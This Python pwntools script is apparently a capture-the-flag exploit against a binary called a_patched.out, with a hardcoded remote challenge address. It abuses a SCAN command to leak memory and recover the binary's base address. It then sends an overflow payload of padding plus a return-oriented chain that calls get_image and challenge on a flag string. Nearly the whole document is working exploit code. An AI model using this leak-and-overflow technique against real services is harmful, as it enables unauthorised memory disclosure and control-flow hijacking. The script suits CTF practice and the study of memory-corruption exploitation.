#!/usr/bin/env python3

# ruff: noqa: F403, F405


from pwn import *
from pwnlib import gdb
from tqdm import trange

elf = context.binary = ELF("./a_patched.out", checksec=False)
libc: ELF = elf.libc  # type: ignore
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc localhost 3490"
    nc = "nc 43.217.80.203 34300"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}

# when there is no need for custom env, this should be set to None
# for some reason when we pass empty dictionary to `gdb.debug`, `pwntools` would
# still launch `gdbserver` with `--wrapper env -i` flag which result in the first
# thing to be debugged is `bash` then `env` and finally our target binary
#
# https://github.com/Gallopsled/pwntools/blob/96d98cf192cf1e9bc5d6bbeff5311e8961e58439/pwnlib/gdb.py#L347
# should have checked `len(env_args) > 0` instead of `env is not None`

if len(env) == 0:
    env = None

gdbscript = """
# b *main+156
"""

io = start()

io.sendlineafter(b"? \x00", b"SCAN")
io.sendafter(b"? \x00", str(0x186A3 + 0x4).encode())
for _ in trange(0x186A0 // 0x10):
    io.recv(0x10)

io.recv(0x3)
do_scan = u32(io.recv(4))
log.info(f"{do_scan=:#x}")
elf.address = do_scan - elf.sym["do_scan"]
log.info(f"{elf.address=:#x}")

flag_str = elf.address + 0x2018

payload = (
    b"QUIT\n"
    + b"A" * 0x39
    + p32(elf.bss(0xC00))
    + p32(elf.sym["get_image"])
    + p32(elf.sym["challenge"])
    + p32(flag_str)
    + p32(0x200)
)
io.sendafter(b"? \x00", payload)


io.interactive()
